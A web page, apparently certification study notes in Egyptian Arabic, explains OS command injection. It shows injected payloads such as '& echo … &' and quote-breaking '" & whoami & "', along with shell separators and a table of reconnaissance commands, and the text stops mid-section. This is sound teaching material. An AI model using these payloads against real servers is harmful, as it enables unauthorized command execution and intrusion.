@@ -1,0 +1,1313 @@
+
+<!doctype html>
+<html lang="ar" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../9-NoSQL%20injection/">
+      
+      
+        <link rel="next" href="../XML%20injection%20%28XXE%29/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>OS Command Injection - eWAPTX Zero-Day Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/hacker_style.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="rtl" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1-os-command-injection" class="md-skip">
+          انتقل إلى المحتوى
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="عنوان العارضة">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-header__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            eWAPTX Zero-Day Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              OS Command Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="بحث" placeholder="بحث" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="إبحث">
+        
+        <button type="reset" class="md-search__icon md-icon" title="مسح كلي" aria-label="مسح كلي" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            بدء البحث
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="تصفح" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-nav__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    eWAPTX Zero-Day Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-EWAPTX/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1 EWAPTX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-EWAPTX%20%28part%202%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2 EWAPTX (part 2)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-Enumeration%20%26%20Brute%20force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication Enumeration — الفكرة ببساطة
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4-JWT%20port_swigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ليه JWT vulnerabilities خطيرة جداً ؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5-Oauth%20portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5 Oauth portswigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6-SQL%20INJECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6 SQL INJECTION
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7-Blind%20Sql%20Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    أولاً: ما هو Blind SQL Injection؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-NOSQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📁 الدليل الشامل لأساسيات MongoDB واختبار اختراق NoSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../9-NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9 NoSQL injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      جدول المحتويات
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-os-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. إيه هي ثغرة الـ OS Command Injection؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. السيناريو الطبيعي (المفروض يحصل إيه؟)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الضربة الخبيثة (الـ Injection)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. تفكيك النتيجة (إيه اللي حصل على السيرفر؟)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. ليه حطينا العلامة &amp; في الآخر؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        (Useful Commands)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الفواصل المشتركة (تشتغل على الكل)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-unixlinux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. فواصل خاصة بـ Unix/Linux فقط
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-inline-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. التنفيذ المضمن (Inline Execution)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-breaking-out-of-quotes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. المطب الأكبر: علامات الاقتباس (Breaking out of Quotes)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-os-command-injection-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind OS command injection vulnerabilities :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-time-delays" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الحل السحري: اختبار الوقت (Time Delays)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-os-command-injection-vulnerabilities-with-data-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind OS command injection vulnerabilities with data exfiltration:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تفكيك الأمر الخبيث
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ليه التكنيك ده ناجح وخطير جداً؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-blind-os-command-injection-by-redirecting-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind OS command injection by redirecting output :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. إزاي التكنيك ده بيشتغل؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. مميزات التكنيك ده
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-the-hackers-reality" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. العقبات في الواقع (The Hacker's Reality)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20injection%20%28XXE%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XML injection (XXE)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      جدول المحتويات
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-os-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. إيه هي ثغرة الـ OS Command Injection؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. السيناريو الطبيعي (المفروض يحصل إيه؟)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الضربة الخبيثة (الـ Injection)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. تفكيك النتيجة (إيه اللي حصل على السيرفر؟)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. ليه حطينا العلامة &amp; في الآخر؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        (Useful Commands)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الفواصل المشتركة (تشتغل على الكل)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-unixlinux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. فواصل خاصة بـ Unix/Linux فقط
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-inline-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. التنفيذ المضمن (Inline Execution)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-breaking-out-of-quotes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. المطب الأكبر: علامات الاقتباس (Breaking out of Quotes)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-os-command-injection-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind OS command injection vulnerabilities :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-time-delays" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الحل السحري: اختبار الوقت (Time Delays)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-os-command-injection-vulnerabilities-with-data-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind OS command injection vulnerabilities with data exfiltration:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تفكيك الأمر الخبيث
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ليه التكنيك ده ناجح وخطير جداً؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-blind-os-command-injection-by-redirecting-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind OS command injection by redirecting output :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. إزاي التكنيك ده بيشتغل؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. مميزات التكنيك ده
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-the-hackers-reality" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. العقبات في الواقع (The Hacker's Reality)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>OS Command Injection</h1>
+
+<h3 id="1-os-command-injection">1. إيه هي ثغرة الـ OS Command Injection؟</h3>
+<p>في أول فقرة، بيعرفك إن الثغرة دي (واللي أحياناً بتتسمى Shell Injection) بتسمح للمهاجم إنه ينفذ أوامر على نظام تشغيل السيرفر نفسه. خطورة الموضوع إنك لو قدرت تنفذ أوامر على السيرفر، إنت تقريباً سيطرت على التطبيق وبياناته، وممكن تستخدم السيرفر ده كنقطة انطلاق (Pivot) عشان تهاجم أجهزة تانية جوه شبكة الشركة.</p>
+<h3 id="2">2. السيناريو الطبيعي (المفروض يحصل إيه؟)</h3>
+<p>تخيل إنك في موقع تسوق، وبتدوس على زرار عشان تشوف منتج معين متوفر في المخزن ولا لأ. الموقع بيبعت طلب (URL) للسيرفر بالشكل ده: <code>https://insecure-website.com/stockStatus?productID=381&amp;storeID=29</code></p>
+<p>السيرفر هنا قديم شوية، عشان يجيبلك النتيجة بياخد رقم المنتج (<code>381</code>) ورقم المخزن (<code>29</code>) ويمررهم كـ "مُعطيات" (Arguments) لسكربت شغال على نظام التشغيل اسمه <code>stockreport.pl</code>. فالأمر اللي بيتنفذ جوه السيرفر في الخلفية بيكون كده: <code>stockreport.pl 381 29</code> السكربت بيشتغل، يدور في الداتا، ويرجعلك النتيجة (المنتج متوفر ولا لأ).</p>
+<h3 id="3-injection">3. الضربة الخبيثة (الـ Injection)</h3>
+<p>التطبيق هنا مصاب بالثغرة لأنه بياخد المدخلات بتاعتك ويمررها للسكربت <strong>من غير ما ينضفها أو يفلترها</strong>. المخترق بدل ما يكتب رقم المنتج <code>381</code>، قام كاتب الكود ده: <code>&amp; echo aiwefwlguh &amp;</code></p>
+<p>السيرفر الغلبان هياخد الكود ده زي ما هو، ويحطه مكان الـ <code>productID</code>. فبدل ما الأمر يكون طبيعي، الأمر اللي هيتنفذ على السيرفر هيبقى شكله كده: <code>stockreport.pl &amp; echo aiwefwlguh &amp; 29</code></p>
+<h3 id="4">4. تفكيك النتيجة (إيه اللي حصل على السيرفر؟)</h3>
+<p>علامة <code>&amp;</code> في أنظمة التشغيل معناها (نفذ الأمر ده، <strong>و</strong> نفذ الأمر اللي بعده). فبسبب العلامتين دول، السيرفر شاف إن المطلوب منه ينفذ <strong>3 أوامر منفصلة</strong> ورا بعض مش أمر واحد:</p>
+<ul>
+<li>
+<p><strong>الأمر الأول:</strong> <code>stockreport.pl</code> (السكربت ده اشتغل بس من غير الأرقام بتاعته، عشان كده رجع رسالة خطأ: <code>Error - productID was not provided</code>).</p>
+</li>
+<li>
+<p><strong>الأمر التاني:</strong> <code>echo aiwefwlguh</code> (أمر <code>echo</code> وظيفته إنه يطبع الكلمة اللي بتيجي بعده. المخترق بيستخدم كلمة عشوائية زي <code>aiwefwlguh</code> عشان لو الكلمة دي ظهرتله على الشاشة، يتأكد مليون في المية إن الثغرة موجودة وإن أوامره بتتنفذ. وفعلاً الكلمة اتطبعت).</p>
+</li>
+<li>
+<p><strong>الأمر التالت:</strong> <code>29</code> (السيرفر حاول يشغل رقم 29 كأنه برنامج أو أمر، وطبعاً مفيش أمر اسمه 29، فرجع رسالة خطأ: <code>29: command not found</code>).</p>
+</li>
+</ul>
+<h3 id="5">5. ليه حطينا العلامة <code>&amp;</code> في الآخر؟</h3>
+<p>السطر الأخير في النص بيشرح تكتيك مهم جداً. المخترق حط <code>&amp;</code> في آخر الكود بتاعه عشان <strong>يعزل</strong> الأمر اللي هو عايزه (<code>echo</code>) عن أي حاجة تانية التطبيق ممكن يضيفها في الآخر (زي رقم المخزن <code>29</code>). لو ماكانش حط الـ <code>&amp;</code> التانية، كان الأمر هيبقى <code>echo aiwefwlguh 29</code>، وده ممكن يبوظ شكل النتيجة أو يخلي الأمر يفشل. الـ <code>&amp;</code> الأخيرة دي بتضمن إن أمر الاختراق يشتغل لوحده بأمان تام.</p>
+<hr />
+<h3 id="useful-commands">(Useful Commands)</h3>
+<p>أول ما بتمسك ثغرة Command Injection، مش بتدخل تدمر السيرفر، الصح إنك تعمل "استطلاع" (Reconnaissance) عشان تعرف إنت واقف فين بالظبط وصلاحياتك إيه. الجدول ده بيقارن بين الأوامر في Linux و Windows:</p>
+<table>
+<thead>
+<tr>
+<th><strong>الهدف من الأمر</strong></th>
+<th><strong>في نظام Linux</strong></th>
+<th><strong>في نظام Windows</strong></th>
+<th><strong>أهميته للمخترق</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>اسم المستخدم الحالي</strong></td>
+<td><code>whoami</code></td>
+<td><code>whoami</code></td>
+<td>بيعرفك صلاحياتك (هل إنت Root/Administrator ولا مستخدم غلبان؟)</td>
+</tr>
+<tr>
+<td><strong>معلومات نظام التشغيل</strong></td>
+<td><code>uname -a</code></td>
+<td><code>ver</code></td>
+<td>بيعرفك إصدار النظام بالظبط عشان تدور على Kernel Exploit ترفع بيه صلاحياتك.</td>
+</tr>
+<tr>
+<td><strong>إعدادات الشبكة</strong></td>
+<td><code>ifconfig</code></td>
+<td><code>ipconfig /all</code></td>
+<td>بيعرفك كروت الشبكة والـ IPs بتاعة السيرفر.</td>
+</tr>
+<tr>
+<td><strong>الاتصالات الحالية</strong></td>
+<td><code>netstat -an</code></td>
+<td><code>netstat -an</code></td>
+<td>بيوريك السيرفر متصل بأجهزة إيه تانية في الشبكة الداخلية.</td>
+</tr>
+<tr>
+<td><strong>العمليات الشغالة حالياً</strong></td>
+<td><code>ps -ef</code></td>
+<td><code>tasklist</code></td>
+<td>بيوريك إيه البرامج والخدمات اللي شغالة في الخلفية وممكن تستغلها.</td>
+</tr>
+<tr>
+<td>### Ways of injecting OS commands:</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="1">1. الفواصل المشتركة (تشتغل على الكل)</h3>
+<p>الحروف دي بتشتغل في الـ Terminal بتاعة Linux والـ CMD بتاعة Windows بنفس الطريقة:</p>
+<ul>
+<li>
+<p><strong><code>&amp;</code> (Sequential):</strong> بيشغل الأوامر ورا بعض بغض النظر الأول نجح ولا فشل.</p>
+</li>
+<li>
+<p><strong><code>&amp;&amp;</code> (Conditional AND):</strong> بيشغل الأمر التاني <strong>بشرط</strong> إن الأمر الأول ينجح تماماً ومن غير أخطاء.</p>
+</li>
+<li>
+<p><strong><code>|</code> (Piping):</strong> بياخد مخرجات (Output) الأمر الأول ويبعتها كـ مدخلات (Input) للأمر التاني.</p>
+</li>
+<li>
+<p><strong><code>||</code> (Conditional OR):</strong> بيشغل الأمر التاني <strong>فقط لو</strong> الأمر الأول فشل.</p>
+</li>
+</ul>
+<h3 id="2-unixlinux">2. فواصل خاصة بـ Unix/Linux فقط</h3>
+<ul>
+<li>
+<p><strong><code>;</code> (Semicolon):</strong> بيفصل بين الأوامر تماماً كأنك دوست Enter وكتبت أمر جديد. (Windows مش بيفهم دي كفاصل أوامر).</p>
+</li>
+<li>
+<p><strong>السطر الجديد (Newline <code>\n</code>):</strong> في طلبات الـ HTTP، المخترق ممكن يبعت الرمز <code>0x0a</code> (وهو القيمة الـ Hexadecimal لزرار الـ Enter)، السيرفر هيفهم إن الأمر الأول خلص ويبدأ ينفذ اللي بعده في سطر جديد.</p>
+</li>
+</ul>
+<h3 id="3-inline-execution">3. التنفيذ المضمن (Inline Execution)</h3>
+<p>في أنظمة Linux، فيه حركتين صايعين جداً باستخدام الـ Backticks <code>أو علامة</code>$( )<code>: لو السيرفر بينفذ أمر زي:</code>echo "Hello USER_INPUT"<code>والمستخدم كتب:</code>$(whoami)<code>الأمر هيبقى:</code>echo "Hello $(whoami)"<code>السيرفر هنا مش هيطبع كلمة whoami، لأ.. هيروح ينفذ أمر</code>whoami<code>الأول جوه كواليس النظام، ويشيله ويحط نتيجته (مثلاً</code>www-data<code>)، فالأمر النهائي يبقى</code> echo "Hello www-data"`. الحركة دي هي اللي استخدمناها فوق في تهريب البيانات عبر الـ DNS!</p>
+<h3 id="4-breaking-out-of-quotes">4. المطب الأكبر: علامات الاقتباس (Breaking out of Quotes)</h3>
+<p>الموضوع ده هو اللي بيفرق بين المحترف والمبتدئ، وهو السبب إن فيه payloads كتير بتفشل.</p>
+<p>أحياناً المطور بيكون كاتب الكود في الـ Back-end ومحاوط مدخلات المستخدم بعلامات تنصيص عشان يحميها، مثلاً كده:</p>
+<p>Bash</p>
+<pre><code>ping &quot;USER_INPUT&quot;
+</code></pre>
+<p>لو المهاجم كتب مباشرة: <code>&amp; whoami</code></p>
+<p>الأمر جوه السيرفر هيبقى:</p>
+<p>Bash</p>
+<pre><code>ping &quot;&amp; whoami&quot;
+</code></pre>
+<p>هنا نظام التشغيل هيتعامل مع <code>&amp; whoami</code> كأنها <strong>كلمة واحدة</strong> أو نص عادي (String) تبع أمر الـ ping، ومفصلات الـ Shell مش هتشتغل، والأمر هيفشل!</p>
+<p><strong>الحل إيه؟</strong></p>
+<p>المخترق لازم "يكسر" الأقواس دي الأول (Terminate the context). فبيكتب في المدخلات:</p>
+<p>Plaintext</p>
+<pre><code>&quot; &amp; whoami &amp; &quot;
+</code></pre>
+<p>لما السيرفر ياخد المدخل ده ويحطه مكانه، الأمر هيبقى:</p>
+<p>Bash</p>
+<pre><code>ping &quot;&quot; &amp; whoami &amp; &quot;&quot;
+</code></pre>
+<blockquote>
+<p>💡 <strong>إيه اللي حصل هنا؟</strong></p>
